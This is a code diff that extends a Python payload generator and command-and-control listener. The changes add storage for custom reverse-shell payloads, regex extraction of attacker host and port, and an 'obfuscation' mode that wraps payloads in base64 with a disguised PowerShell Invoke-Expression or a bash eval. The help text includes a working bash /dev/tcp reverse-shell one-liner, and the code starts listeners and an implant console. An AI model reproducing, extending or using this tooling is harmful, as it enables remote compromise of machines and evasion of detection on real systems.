@@ -16,6 +16,9 @@ import sys
 import threading
 import time
 from select import select
+import argparse
+import json
+import base64
 
 # external deps
 from colorama import Fore, Style, init as colorama_init
@@ -119,6 +122,310 @@ def generate_payload_text(module, payload_key: str, lhost: str, lport: int) -> s
     # replace both placeholders robustly
     payload = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
     return payload
+
+# -----------------------
+# Custom payload storage / helpers
+# -----------------------
+
+def normalize_os_choice(flag: str) -> str:
+    if not flag:
+        return None
+    val = flag.strip().lower()
+    if val in ("w", "win", "windows"):
+        return "Windows"
+    if val in ("l", "lin", "linux"):
+        return "Linux"
+    return None
+
+
+def normalize_connection(flag: str) -> str:
+    if not flag:
+        return None
+    val = flag.strip().lower()
+    if val in ("tcp", "http"):
+        return val
+    return None
+
+
+def normalize_crypto(flag: str) -> str | None:
+    """Map user flag to 'encode' or 'obfuscation' or None."""
+    if not flag:
+        return None
+    v = flag.strip().lower()
+    if v in ("encode", "encoding", "base64", "b64"):
+        return "encode"
+    if v in ("obfuscation", "obfuscate", "obf", "obs"):
+        return "obfuscation"
+    if v in ("none", "off"):
+        return None
+    return None
+
+
+def get_custom_store_path(os_choice: str) -> str:
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    filename = "custom_windows.json" if os_choice == "Windows" else "custom_linux.json"
+    return os.path.join(base_dir, "payloads", filename)
+
+
+def load_custom_payloads(os_choice: str) -> dict:
+    """Load custom payloads for the OS. Structure: { name: {"template": str, "con": "tcp"|"http"} }"""
+    path = get_custom_store_path(os_choice)
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            data = json.load(f)
+            if isinstance(data, dict):
+                return data
+            return {}
+    except FileNotFoundError:
+        return {}
+    except Exception:
+        return {}
+
+
+def save_custom_payload(os_choice: str, name: str, template: str, connection: str) -> None:
+    path = get_custom_store_path(os_choice)
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    current = load_custom_payloads(os_choice)
+    current[name] = {"template": template, "con": connection}
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump(current, f, indent=2)
+
+
+def read_payload_source(maybe_path: str) -> str:
+    """Return file contents if maybe_path points to a readable file (supports @file), else return the string itself."""
+    if not isinstance(maybe_path, str) or not maybe_path.strip():
+        return maybe_path
+    candidate = maybe_path.strip()
+    if candidate.startswith("@"):
+        candidate = candidate[1:].strip()
+    expanded = os.path.expanduser(candidate)
+    try_paths = [expanded, os.path.abspath(expanded)]
+    for p in try_paths:
+        try:
+            if os.path.isfile(p):
+                with open(p, "r", encoding="utf-8", errors="ignore") as f:
+                    return f.read()
+        except Exception:
+            pass
+    return maybe_path
+
+
+def extract_host_port(payload_text: str) -> tuple[str | None, int | None]:
+    """Best-effort extraction of host and port from payload text.
+    Prefers IPv4 candidates. Returns (host, port) or (None, None) if not found.
+    """
+    if not isinstance(payload_text, str) or not payload_text:
+        return (None, None)
+    text = payload_text
+    host_port_pairs: list[tuple[str, int]] = []
+    hosts: list[str] = []
+    ports: list[int] = []
+
+    def add_pair(h: str, p: str | int):
+        try:
+            pi = int(p)
+            if 1 <= pi <= 65535:
+                host_port_pairs.append((h, pi))
+        except Exception:
+            return
+
+    # /dev/tcp/HOST/PORT
+    for h, p in re.findall(r"/dev/tcp/([A-Za-z0-9\-.]+)/([0-9]{1,5})", text):
+        add_pair(h, p)
+
+    # TCPClient('HOST', PORT)
+    for h, p in re.findall(r"(?i)TCPClient\(\s*['\"]([^'\"]+)['\"]\s*,\s*([0-9]{1,5})\s*\)", text):
+        add_pair(h, p)
+
+    # Generic HOST:PORT (includes $s='host:port')
+    for h, p in re.findall(r"\b([A-Za-z0-9\-.]+)\s*:\s*([0-9]{1,5})\b", text):
+        add_pair(h, p)
+
+    # HTTP URLs
+    for h, p in re.findall(r"(?i)https?://([A-Za-z0-9\-.]+)(?::([0-9]{1,5}))?", text):
+        if p:
+            add_pair(h, p)
+        else:
+            hosts.append(h)
+
+    # nc host port
+    for h, p in re.findall(r"(?i)\bnc(?:at)?\b[^\n]*?\s([A-Za-z0-9\-.]+)\s+([0-9]{1,5})\b", text):
+        add_pair(h, p)
+
+    # Variable assignments
+    for h in re.findall(r"\$LHOST\s*=\s*['\"]([^'\"]+)['\"]", text):
+        hosts.append(h)
+    for p in re.findall(r"\$LPORT\s*=\s*([0-9]{1,5})\b", text):
+        try:
+            ports.append(int(p))
+        except Exception:
+            pass
+
+    # BRUTE-FORCE ADDITIONAL SCANS
+    # IPv4 dotted-quad anywhere
+    for cand in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", text):
+        if is_valid_ipv4(cand):
+            hosts.append(cand)
+    # Numeric tokens as ports (prefer 4-5 digits, but accept 1-5)
+    numeric_tokens = re.findall(r"\b\d{1,5}\b", text)
+    for tok in numeric_tokens:
+        try:
+            val = int(tok)
+            if 1 <= val <= 65535:
+                ports.append(val)
+        except Exception:
+            pass
+
+    # Choose host
+    chosen_host = None
+    # Prefer host from pairs that is IPv4
+    for h, _ in host_port_pairs:
+        if is_valid_ipv4(h):
+            chosen_host = h
+            break
+    if chosen_host is None:
+        # Next, any IPv4 from hosts list
+        for h in hosts:
+            if is_valid_ipv4(h):
+                chosen_host = h
+                break
+    if chosen_host is None and host_port_pairs:
+        chosen_host = host_port_pairs[0][0]
+    if chosen_host is None and hosts:
+        chosen_host = hosts[0]
+
+    # Choose port (prefer 4-5 digit tokens if available)
+    chosen_port = None
+    if host_port_pairs:
+        chosen_port = host_port_pairs[0][1]
+    if chosen_port is None and ports:
+        # prefer 4-5 digits
+        long_ports = [p for p in ports if p >= 1000]
+        chosen_port = (long_ports[0] if long_ports else ports[0])
+
+    return (chosen_host, chosen_port)
+
+
+def template_payload_content(raw: str, lhost: str, lport: int) -> str:
+    try:
+        port_str = str(lport)
+        host_re = re.escape(lhost)
+        port_re = re.escape(port_str)
+        out = raw
+        # 1) Replace host+port occurrences first (e.g., 10.0.0.1:4444 or 10.0.0.1/4444)
+        out = re.sub(rf'({host_re})(:|/){port_re}', r'{LHOST}\2{LPORT}', out)
+        # 2) Replace standalone host (constants) with placeholder
+        out = re.sub(host_re, '{LHOST}', out)
+        # 3) Replace port in common explicit contexts using the provided lport
+        #    - after ':' or '/'
+        out = re.sub(rf'(?<=:){port_re}(?!\d)', '{LPORT}', out)
+        out = re.sub(rf'(?<=/){port_re}(?!\d)', '{LPORT}', out)
+        #    - after '=' allowing optional whitespace (keep '=')
+        out = re.sub(rf'(=)\s*{port_re}(?!\d)', r'\1{LPORT}', out)
+        #    - after ',' allowing optional whitespace (argument lists)
+        out = re.sub(rf'(?<=,)\s*{port_re}(?!\d)', '{LPORT}', out)
+        #    - quoted numbers
+        out = re.sub(rf'(["\"])\s*{port_re}\s*(["\"])', r'\1{LPORT}\2', out)
+        #    - standalone numeric token
+        out = re.sub(rf'(?<!\d){port_re}(?!\d)', '{LPORT}', out)
+
+        # 4) Heuristic replacements if no {LPORT} yet (cover hard-coded ports not matching user-provided lport)
+        if '{LPORT}' not in out:
+            # a) PowerShell-style: $LPORT = 4444
+            out = re.sub(r'(\$LPORT\s*=\s*)\d{1,5}', r'\1{LPORT}', out)
+        if '{LPORT}' not in out:
+            # b) TCPClient(host, 4444)
+            out = re.sub(r'(?i)(TCPClient\([^,]+,\s*)\d{1,5}', r'\1{LPORT}', out)
+        if '{LPORT}' not in out:
+            # c) After {LHOST} or $LHOST separated by comma
+            out = re.sub(r'(\{LHOST\}|\$LHOST)\s*,\s*\d{1,5}', r'\1,{LPORT}', out)
+        if '{LPORT}' not in out:
+            # d) {LHOST}:4444 or {LHOST}/4444
+            out = re.sub(r'(\{LHOST\})(:|/)\d{1,5}', r'\1\2{LPORT}', out)
+        if '{LPORT}' not in out:
+            # e) Netcat-like: "... {LHOST} 4444 ..."
+            out = re.sub(r'(\{LHOST\})\s+\d{1,5}', r'\1 {LPORT}', out)
+
+        return out
+    except Exception:
+        # Fallback (naive) replacement
+        return raw.replace(lhost, '{LHOST}').replace(str(lport), '{LPORT}')
+
+
+def obfuscate_payload(os_choice: str, payload_text: str) -> str:
+    """Return an obfuscated wrapper that reconstructs and executes the payload at runtime.
+    Uses base64 + minimal token obfuscation for reliability.
+    """
+    try:
+        b64 = base64.b64encode(payload_text.encode('utf-8')).decode('utf-8')
+    except Exception:
+        b64 = payload_text
+    if os_choice == "Windows":
+        # PowerShell wrapper with light obfuscation of Invoke-Expression
+        return (
+            "$b='{b}'; $d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); "
+            "I`E`X $d"
+        ).format(b=b64)
+    # Linux/Unix
+    # Use eval + base64 decode
+    return f"eval \"$(echo '{b64}' | base64 -d)\""
+
+
+def infer_connection_type_from_template(template: str) -> str:
+    """Best-effort inference: return 'http' if HTTP indicators present else 'tcp'."""
+    low = (template or "").lower()
+    if ("http://" in low) or ("https://" in low) or ("invoke-webrequest" in low) or ("iwr " in low) or ("curl " in low) or ("wget " in low):
+        return "http"
+    return "tcp"
+
+
+def merge_builtins_and_customs(builtins: dict, customs: dict) -> dict:
+    """Return a new dict name->template (customs override builtins on key collision)."""
+    merged = dict(builtins or {})
+    for name, entry in (customs or {}).items():
+        if isinstance(entry, dict) and "template" in entry:
+            merged[name] = entry["template"]
+        elif isinstance(entry, str):
+            merged[name] = entry
+    return merged
+
+
+def list_keys_filtered_by_connection(builtins: dict, customs: dict, connection: str) -> list:
+    """Return sorted list of keys whose connection matches the requested connection."""
+    keys = []
+    seen = set()
+    # built-ins by inference
+    for k, tmpl in (builtins or {}).items():
+        if k in seen:
+            continue
+        conn = infer_connection_type_from_template(tmpl)
+        if conn == connection:
+            keys.append(k)
+            seen.add(k)
+    # customs by explicit meta or inference fallback
+    for k, entry in (customs or {}).items():
+        if k in seen:
+            continue
+        if isinstance(entry, dict):
+            conn = entry.get("con") or infer_connection_type_from_template(entry.get("template", ""))
+            tmpl = entry.get("template", "")
+        else:
+            conn = infer_connection_type_from_template(str(entry))
+            tmpl = str(entry)
+        if conn == connection:
+            keys.append(k)
+            seen.add(k)
+    return sorted(keys)
+
+
+def find_available_port(host: str, start_port: int, limit: int = 50) -> int:
+    """Return start_port if bindable, else scan up to start_port+limit for a free port."""
+    if can_bind(host, start_port):
+        return start_port
+    for p in range(start_port + 1, start_port + 1 + limit):
+        if can_bind(host, p):
+            return p
+    return None
 
 # -----------------------
 # C2 / Listener code (adapted from your listener)
@@ -671,98 +978,366 @@ def c2_console():
 # main entrypoint
 # -----------------------
 def main():
-    global HOST, HTTP_PORT, RAW_TCP_PORT
+    global HOST, HTTP_PORT, RAW_TCP_PORT, OS_CHOICE
 
     print("=== Payload Generator + Listener ===\n")
 
-    # choose OS first
-    os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
+    # CLI parsing
+    parser = argparse.ArgumentParser(
+        description="Payload generator + C2 listener",
+        formatter_class=argparse.RawTextHelpFormatter,
+        epilog=(
+            "Examples:\n"
+            "  - Use built-ins or stored payloads and start listeners:\n"
+            "    ./main.py -m=b -os=l -con=tcp -lhost=127.0.0.1 -lport=4444\n"
+            "    ./main.py -m=b -os=w -con=http -lhost=10.0.0.5 -lport=2222\n"
+            "    Optional: -k=<payload_key> to auto-select.\n\n"
+            "  - Store a custom payload (host/port will be templated as {LHOST}/{LPORT}):\n"
+            "    ./main.py -m=c -os=l -con=tcp -lhost=127.0.0.1 -lport=5555 -n=mybash -pay='bash -i >& /dev/tcp/127.0.0.1/5555 0>&1'\n"
+            "    ./main.py -m=c -os=w -con=http -lhost=10.0.0.5 -lport=2222 -n=mypwsh -pay=\"powershell ... http://10.0.0.5:2222 ...\"\n\n"
+            "Notes:\n"
+            "- -os: l (Linux) or w (Windows)\n"
+            "- -con: tcp or http\n"
+            "- In -m=b, the opposite listener uses defaults (HTTP 2222, TCP 4444).\n"
+            "- Custom payloads are saved in payloads/custom_linux.json or payloads/custom_windows.json.\n"
+        ),
+    )
+    parser.add_argument("-help", action="help", help="Show this help message and exit")
+    parser.add_argument("-m", "--mode", help="Mode: b = use/generate & listen, c = create/store payload")
+    parser.add_argument("-os", "--os", dest="os_flag", help="Target OS: w = Windows, l = Linux")
+    parser.add_argument("-con", "--connection", dest="connection", help="Connection type: http or tcp")
+    parser.add_argument("-lhost", dest="lhost", help="Listener host / LHOST")
+    parser.add_argument("-lport", dest="lport", type=int, help="Listener port / LPORT for the chosen connection type")
+    parser.add_argument("-n", "--name", dest="name", help="Name for the payload (store mode)")
+    parser.add_argument("-pay", "--payload", dest="payload", help="Payload content (store mode). Include your actual IP and port so they can be templated.")
+    parser.add_argument("-k", "--key", dest="key", help="Key/name of payload to auto-select (use mode)")
+    parser.add_argument("-cry", "--crypto", dest="crypto", help="Optional: encode (base64) or obfuscation")
+    args, unknown = parser.parse_known_args()
 
-    # get LHOST
-    lhost = ask_ip("Enter LHOST (IPv4) to bind listeners and inject into payload: ")
+    # If explicit CLI mode is requested
+    if args.mode:
+        mode = args.mode.strip().lower()
+        if mode not in ("b", "c"):
+            print("[!] Invalid -m. Use -m=b (use) or -m=c (create).")
+            sys.exit(2)
 
-    http_port = None
-    tcp_port = None
+        os_choice = normalize_os_choice(args.os_flag)
+        if not os_choice:
+            print("[!] -os is required (w or l).")
+            sys.exit(2)
 
-    if os_choice == "Windows":
-        # Ask only for HTTP port for Windows payloads; set default TCP 4444
+        if mode == "c":
+            # Create/store payload
+            connection = normalize_connection(args.connection)
+            if connection not in ("http", "tcp"):
+                print("[!] In create mode, -con must be 'http' or 'tcp'.")
+                sys.exit(2)
+            if not args.name:
+                print("[!] In create mode, -n (payload name) is required.")
+                sys.exit(2)
+            if not args.payload:
+                print("[!] In create mode, -pay (payload content) is required.")
+                sys.exit(2)
+
+            # Ensure unique payload name across built-ins and custom store
+            try:
+                builtin_names = set(getattr(load_payload_module(os_choice), "payloads", {}).keys())
+            except Exception:
+                builtin_names = set()
+            custom_names = set(load_custom_payloads(os_choice).keys())
+            if args.name in builtin_names or args.name in custom_names:
+                print(f"[!] Payload name '{args.name}' already exists. Choose a different name.")
+                sys.exit(2)
+
+            # Load and auto-extract host/port from payload
+            raw = read_payload_source(args.payload)
+            ex_host, ex_port = extract_host_port(raw)
+            if not ex_host or not ex_port:
+                print("[!] Could not auto-detect LHOST/LPORT from payload. Please include a host:port or TCPClient('host',port), etc.")
+                sys.exit(2)
+
+            # Confirm/override if running interactively (TTY)
+            try:
+                is_tty = sys.stdin.isatty()
+            except Exception:
+                is_tty = False
+            if is_tty:
+                print(f"[*] Detected LHOST={ex_host}, LPORT={ex_port}. Is this correct? (y/N): ", end="")
+                ans = input("").strip().lower()
+                if ans != "y":
+                    # Allow manual override
+                    while True:
+                        mh = input("Enter LHOST (IPv4): ").strip()
+                        if is_valid_ipv4(mh):
+                            ex_host = mh
+                            break
+                        print("[!] Invalid IPv4.")
+                    while True:
+                        mp = input("Enter LPORT (1-65535): ").strip()
+                        if mp.isdigit() and 1 <= int(mp) <= 65535:
+                            ex_port = int(mp)
+                            break
+                        print("[!] Invalid port.")
+
+            templated = template_payload_content(raw, ex_host, ex_port)
+            save_custom_payload(os_choice, args.name, templated, connection)
+            print(f"[+] Stored payload '{args.name}' for {os_choice} ({connection}).")
+            sys.exit(0)
+
+        # Use/generate and listen
+        connection = normalize_connection(args.connection)
+        if connection not in ("http", "tcp"):
+            print("[!] In use mode, -con must be 'http' or 'tcp'.")
+            sys.exit(2)
+        if not (args.lhost and is_valid_ipv4(args.lhost)):
+            print("[!] In use mode, a valid -lhost is required.")
+            sys.exit(2)
+        if not (args.lport and 1 <= args.lport <= 65535):
+            print("[!] In use mode, a valid -lport (1-65535) is required.")
+            sys.exit(2)
+
+        lhost = args.lhost
+        DEFAULT_HTTP = 2222
+        DEFAULT_TCP = 4444
+        # Assign ports based on chosen connection; the other gets a default (adjust if unavailable)
+        if connection == "tcp":
+            tcp_port = args.lport
+            http_port = find_available_port(lhost, DEFAULT_HTTP) or DEFAULT_HTTP
+        else:
+            # http
+            http_port = args.lport
+            tcp_port = find_available_port(lhost, DEFAULT_TCP) or DEFAULT_TCP
+
+        if not can_bind(lhost, http_port):
+            print(f"[!] Cannot bind HTTP on {lhost}:{http_port}.")
+            sys.exit(2)
+        if not can_bind(lhost, tcp_port):
+            print(f"[!] Cannot bind TCP on {lhost}:{tcp_port}.")
+            sys.exit(2)
+
+        # Load built-in + custom payloads and filter by connection
+        module = load_payload_module(os_choice)
+        customs = load_custom_payloads(os_choice)
+        combined = merge_builtins_and_customs(getattr(module, "payloads", {}), customs)
+
+        # Keys filtered by requested connection
+        keys = list_keys_filtered_by_connection(getattr(module, "payloads", {}), customs, connection)
+        if not keys:
+            print(f"[!] No payloads available for {os_choice} ({connection}). Add some with -m=c.")
+            sys.exit(2)
+
+        print("\nAvailable payloads (filtered):")
+        for k in keys:
+            print(" -", k)
+
+        # Choose key (CLI or prompt)
+        if args.key:
+            if args.key not in combined or args.key not in keys:
+                print(f"[!] Payload key '{args.key}' not found for the requested filters.")
+                sys.exit(2)
+            payload_key = args.key
+        else:
+            payload_key = ask_choice("Select payload (type exact key): ", keys)
+
+        # Create a proxy module with merged dict for generator
+        ModuleProxy = type("ModuleProxy", (), {})
+        module_proxy = ModuleProxy()
+        module_proxy.payloads = combined
+
+        selected_port = tcp_port if connection == "tcp" else http_port
+        payload_text = generate_payload_text(module_proxy, payload_key, lhost, selected_port)
+
+        # Optional crypto transform
+        crypto_mode = normalize_crypto(getattr(args, "crypto", None))
+        if crypto_mode == "encode":
+            try:
+                encoded = base64.b64encode(payload_text.encode("utf-8")).decode("utf-8")
+            except Exception:
+                encoded = payload_text
+            display_text = encoded
+        elif crypto_mode == "obfuscation":
+            display_text = obfuscate_payload(os_choice, payload_text)
+        else:
+            display_text = payload_text
+
+        print("\n[+] Generated payload (copied to clipboard):\n")
+        print(Fore.RED + display_text + Style.RESET_ALL)
+        try:
+            pyperclip.copy(display_text)
+            print("[+] Payload copied to clipboard.")
+        except Exception as e:
+            print(f"[!] Could not copy to clipboard: {e}")
+
+        # Assign globals and start listeners + console
+        HOST = lhost
+        HTTP_PORT = http_port
+        RAW_TCP_PORT = tcp_port
+        global OS_CHOICE
+        OS_CHOICE = os_choice
+        try:
+            threading.Thread(target=run_http_server, daemon=True).start()
+            threading.Thread(target=monitor_http_implants, daemon=True).start()
+            threading.Thread(target=run_raw_tcp_server, daemon=True).start()
+            time.sleep(0.5)
+            print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
+            c2_console()
+        except Exception as e:
+            print(f"[!] Failed to start listeners: {e}")
+            sys.exit(1)
+        return
+
+    # ------------------
+    # Interactive mode (mirrors CLI)
+    # ------------------
+
+    mode_choice = ask_choice("Mode (Use/Store): ", ["Use", "Store"])
+
+    if mode_choice == "Store":
+        os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
+        connection = ask_choice("Connection type (tcp/http): ", ["tcp", "http"])
+        name = ""
         while True:
-            http_port = ask_port("Enter HTTP listener port (1-65535) [Linux TCP will default to 4444]: ")
-            if not can_bind(lhost, http_port):
-                print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
+            name = input("Enter payload name: ").strip()
+            if not name:
+                print("[!] Name cannot be empty.")
+                continue
+            try:
+                builtin_names = set(getattr(load_payload_module(os_choice), "payloads", {}).keys())
+            except Exception:
+                builtin_names = set()
+            custom_names = set(load_custom_payloads(os_choice).keys())
+            if name in builtin_names or name in custom_names:
+                print("[!] A payload with this name already exists. Choose a different name.")
                 continue
             break
-        # Assign default TCP for Linux side
-        tcp_port = 4444
-        if not can_bind(lhost, tcp_port):
-            print(f"[!] Default TCP 4444 unavailable on {lhost}.")
+        pay_content = ""
+        while not pay_content:
+            src = input("Enter payload content OR @/path/to/file: ").strip()
+            if not src:
+                print("[!] Payload content cannot be empty.")
+                continue
+            pay_content = read_payload_source(src)
+        ex_host, ex_port = extract_host_port(pay_content)
+        if not ex_host or not ex_port:
+            print("[!] Could not auto-detect LHOST/LPORT from payload. Include host and port (e.g., host:port or TCPClient('host',port)).")
+            sys.exit(2)
+        print(f"[*] Detected LHOST={ex_host}, LPORT={ex_port}. Is this correct? (y/N): ", end="")
+        ans = input("").strip().lower()
+        if ans != "y":
+            # Manual override
             while True:
-                tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
-                if not can_bind(lhost, tcp_port):
-                    print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
-                    continue
-                break
-        else:
-            print(f"[*] Using default TCP port {tcp_port} for Linux listener.")
-    else:
-        # Ask only for TCP port for Linux payloads; set default HTTP 2222
+                mh = input("Enter LHOST (IPv4): ").strip()
+                if is_valid_ipv4(mh):
+                    ex_host = mh
+                    break
+                print("[!] Invalid IPv4.")
+            while True:
+                mp = input("Enter LPORT (1-65535): ").strip()
+                if mp.isdigit() and 1 <= int(mp) <= 65535:
+                    ex_port = int(mp)
+                    break
+                print("[!] Invalid port.")
+        templated = template_payload_content(pay_content, ex_host, ex_port)
+        save_custom_payload(os_choice, name, templated, connection)
+        print(f"[+] Stored payload '{name}' for {os_choice} ({connection}).")
+        sys.exit(0)
+
+    # Use/generate and listen
+    os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
+    connection = ask_choice("Connection type (tcp/http): ", ["tcp", "http"])
+    lhost = ask_ip("Enter LHOST (IPv4): ")
+
+    DEFAULT_HTTP = 2222
+    DEFAULT_TCP = 4444
+    http_port = None
+    tcp_port = None
+    if connection == "tcp":
+        # Ask TCP; default HTTP
         while True:
-            tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535) [Windows HTTP will default to 2222]: ")
+            tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
             if not can_bind(lhost, tcp_port):
                 print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
                 continue
             break
-        # Assign default HTTP for Windows side
-        http_port = 2222
+        http_port = find_available_port(lhost, DEFAULT_HTTP) or DEFAULT_HTTP
         if not can_bind(lhost, http_port):
-            print(f"[!] Default HTTP 2222 unavailable on {lhost}.")
+            print(f"[!] Default HTTP {DEFAULT_HTTP} unavailable on {lhost}.")
             while True:
                 http_port = ask_port("Enter HTTP listener port (1-65535): ")
                 if not can_bind(lhost, http_port):
                     print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
                     continue
                 break
-        else:
-            print(f"[*] Using default HTTP port {http_port} for Windows listener.")
+    else:
+        # Ask HTTP; default TCP
+        while True:
+            http_port = ask_port("Enter HTTP listener port (1-65535): ")
+            if not can_bind(lhost, http_port):
+                print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
+                continue
+            break
+        tcp_port = find_available_port(lhost, DEFAULT_TCP) or DEFAULT_TCP
+        if not can_bind(lhost, tcp_port):
+            print(f"[!] Default TCP {DEFAULT_TCP} unavailable on {lhost}.")
+            while True:
+                tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
+                if not can_bind(lhost, tcp_port):
+                    print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
+                    continue
+                break
 
-    # load payload module (linux/windows) and list keys
     module = load_payload_module(os_choice)
-    keys = list(module.payloads.keys())
-    print("\nAvailable payloads:")
+    customs = load_custom_payloads(os_choice)
+    keys = list_keys_filtered_by_connection(getattr(module, "payloads", {}), customs, connection)
+    if not keys:
+        print(f"[!] No payloads available for {os_choice} ({connection}). Add some with -m=c or 'Store' mode.")
+        sys.exit(2)
+
+    print("\nAvailable payloads (filtered):")
     for k in keys:
         print(" -", k)
 
     payload_key = ask_choice("Select payload (type exact key): ", keys)
 
-    # generate payload using the relevant port for the selected OS
-    selected_port = tcp_port if os_choice == "Linux" else http_port
-    payload_text = generate_payload_text(module, payload_key, lhost, selected_port)
+    combined = merge_builtins_and_customs(getattr(module, "payloads", {}), customs)
+    ModuleProxy = type("ModuleProxy", (), {})
+    module_proxy = ModuleProxy()
+    module_proxy.payloads = combined
 
-    # display and copy
+    selected_port = tcp_port if connection == "tcp" else http_port
+    payload_text = generate_payload_text(module_proxy, payload_key, lhost, selected_port)
+
+    # Interactive crypto option
+    crypto_choice = ask_choice("Crypto (none/encode/obfuscation): ", ["none", "encode", "obfuscation"])
+    if crypto_choice == "encode":
+        try:
+            payload_out = base64.b64encode(payload_text.encode("utf-8")).decode("utf-8")
+        except Exception:
+            payload_out = payload_text
+    elif crypto_choice == "obfuscation":
+        payload_out = obfuscate_payload(os_choice, payload_text)
+    else:
+        payload_out = payload_text
+
     print("\n[+] Generated payload (copied to clipboard):\n")
-    print(Fore.RED + payload_text + Style.RESET_ALL)
+    print(Fore.RED + payload_out + Style.RESET_ALL)
     try:
-        pyperclip.copy(payload_text)
+        pyperclip.copy(payload_out)
         print("[+] Payload copied to clipboard.")
     except Exception as e:
         print(f"[!] Could not copy to clipboard: {e}")
 
-    # assign globals for listener
     HOST = lhost
     HTTP_PORT = http_port
     RAW_TCP_PORT = tcp_port
-    # store OS choice globally for later logic
-    global OS_CHOICE
     OS_CHOICE = os_choice
 
-    # start both listeners
     try:
         threading.Thread(target=run_http_server, daemon=True).start()
         threading.Thread(target=monitor_http_implants, daemon=True).start()
         threading.Thread(target=run_raw_tcp_server, daemon=True).start()
         time.sleep(0.5)
         print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
-        # Enter C2 console (blocking)
         c2_console()
     except Exception as e:
         print(f"[!] Failed to start listeners: {e}")
